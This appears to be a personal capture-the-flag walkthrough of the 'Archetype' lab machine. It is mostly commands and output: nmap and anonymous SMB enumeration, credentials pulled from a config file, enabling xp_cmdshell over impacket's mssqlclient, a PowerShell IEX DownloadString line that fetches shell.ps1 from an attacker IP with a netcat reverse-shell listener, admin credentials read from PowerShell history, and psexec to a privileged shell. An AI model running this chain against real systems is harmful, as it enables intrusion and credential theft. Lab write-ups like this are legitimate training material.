# 10.10.10.27

---

## nmap -sS -sC -sV 10.10.10.27

```
PORT     STATE SERVICE    VERSION
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped Windows Server 2019 Standard 17763 tcpwrapped
1433/tcp open  ms-sql-s   Microsoft SQL Server 2017 14.00.1000.00; RTM
```

---

## smbclient -N -L 10.10.10.27

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

---

## smbclient -N \\\\10.10.10.27\\backups

```
  .                                   D        0  Mon Jan 20 15:20:57 2020
  ..                                  D        0  Mon Jan 20 15:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 15:23:02 2020

```

## In config:

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

Username: ARCHETYPE

Pass: M3g4c0rp123

---

## python3 impacket/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth

++ [Code Fix of tds.py](https://github.com/SecureAuthCorp/impacket/issues/856)

```
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> exec sp_configure 'Show Advanced Options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> exec sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL  
```

No admin privileges.

Next is reverse shell.

---

## xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.65/shell.ps1\");""

Script saved in ```shell.ps1```, had to do some clean up and fix the IP adress.

```
    sudo python3 -m http.server 80  //  shell.ps1 taken from here.
    sudo nc -lvnp 443   //  Reverse shell is sent to here.
```
Reverse shell is now ready.

---

## type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Username: administrator

Pass: MEGACORP_4dm1n!!

---

## python3 impacket/psexec.py administrator@10.10.10.27

And we have a privileged remote shell.

---

## Inside users


user.txt:
    ~~3e7b102e78218e935bf3f4951fec21a3~~

root.txt:
    ~~b91ccec3305e98240082d4474b848528~~

